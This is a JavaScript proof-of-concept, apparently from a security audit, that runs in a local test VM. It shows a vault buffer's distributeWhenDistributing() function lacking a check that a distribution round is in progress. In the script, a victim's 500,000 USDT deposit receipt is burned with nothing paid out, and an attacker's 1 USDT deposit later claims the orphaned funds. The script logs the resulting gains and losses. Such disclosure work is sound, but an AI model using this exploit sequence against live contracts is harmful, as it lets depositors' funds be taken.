const S=require('./setup.js'); const A=require('./account.js');
const {E,ABI,U,big}=S; const F=A.F;
const usdi=async(vm,s,w)=> big(vm,w.addr,s.peg,ABI.peg(),'balanceOf',[w.hex]);
const tusdi=async(vm,s,w)=> big(vm,w.addr,s.buf,ABI.buf(),'balanceOf',[w.hex]);
const bcash=async(vm,s,t,d)=> F(await big(vm,s.W.gov.addr,t,ABI.erc20(),'balanceOf',[s.buf]),d);

(async()=>{
 const vm=await E.newVM(); const s=await S.build(vm); const {W}=s;
 for(const t of [s.usdt,s.usdc,s.dai]) await E.send(vm,W.gov,s.vault,ABI.admin(),'addAsset',[t]);

 console.log('### PoC: VaultBuffer.distributeWhenDistributing() sin precondicion isDistributing');
 console.log('\n[1] usuario A (victima) deposita 1,000,000 USDT y se cierra la ronda normalmente');
 await S.mintDeposit(vm,s,W.u1,[s.usdt],[U('1000000',6).toString()]);
 await E.send(vm,W.keeper,s.vault,ABI.vault(),'startAdjustPosition',[]);
 await E.send(vm,W.keeper,s.vault,ABI.vault(),'endAdjustPosition',[]);
 await E.send(vm,W.keeper,s.buf,ABI.buf(),'distributeWhenDistributing',[]);
 console.log('    isDistributing =', (await big(vm,W.gov.addr,s.buf,ABI.buf(),'isDistributing'))===1n);
 console.log('    A: USDi =', F(await usdi(vm,s,W.u1)), ' tUSDi =', F(await tusdi(vm,s,W.u1)));
 console.log('    buffer cash =', await bcash(vm,s,s.usdt,6), ' buffer tUSDi supply =', F(await big(vm,W.gov.addr,s.buf,ABI.buf(),'totalSupply')));

 console.log('\n[2] usuario B (victima) deposita 500,000 USDT fuera de ronda (estado normal)');
 await S.mintDeposit(vm,s,W.u2,[s.usdt],[U('500000',6).toString()]);
 console.log('    B: tUSDi =', F(await tusdi(vm,s,W.u2)), ' (recibo 1:1)');
 console.log('    buffer cash =', await bcash(vm,s,s.usdt,6), ' isDistributing =', (await big(vm,W.gov.addr,s.buf,ABI.buf(),'isDistributing'))===1n);

 console.log('\n[3] keeper invoca distributeWhenDistributing() (funcion de keeper documentada)');
 await E.send(vm,W.keeper,s.buf,ABI.buf(),'distributeWhenDistributing',[]);
 console.log('    B: tUSDi =', F(await tusdi(vm,s,W.u2)), '  USDi recibido =', F(await usdi(vm,s,W.u2)), '   <-- recibo quemado, 0 pagado');
 console.log('    buffer cash sigue en', await bcash(vm,s,s.usdt,6), 'USDT (huerfano)');

 console.log('\n[4] atacante C deposita 1 USDT y espera el siguiente ciclo normal');
 await S.mintDeposit(vm,s,W.att,[s.usdt],[U('1',6).toString()]);
 await E.send(vm,W.keeper,s.vault,ABI.vault(),'startAdjustPosition',[]);
 await E.send(vm,W.keeper,s.vault,ABI.vault(),'endAdjustPosition',[]);
 await E.send(vm,W.keeper,s.buf,ABI.buf(),'distributeWhenDistributing',[]);
 console.log('    C: deposito 1 USDT -> USDi =', F(await usdi(vm,s,W.att)));

 const sn=await A.snap(vm,s);
 console.log('\n### Resultado (PnL en USD, precio 1:1, sin yield)');
 const puts={u1:1000000n*10n**18n, u2:500000n*10n**18n, att:1n*10n**12n}; // en USD 1e18
 for(const k of ['u1','u2','att']){
   const c=A.claim(sn,k), p=puts[k];
   console.log(`  ${k.padEnd(4)} puso ${F(p).padStart(14)}  ->  reclama ${F(c).padStart(16)}   PnL = ${F(c-p)}`);
 }
 const tot = A.claim(sn,'u1')+A.claim(sn,'u2')+A.claim(sn,'att');
 console.log('  suma de reclamos =', F(tot), ' (depositado 1,500,001)  -> conservacion OK, no se crea dinero: solo cambia de dueno');
})().catch(e=>console.log('FAIL',e.message));
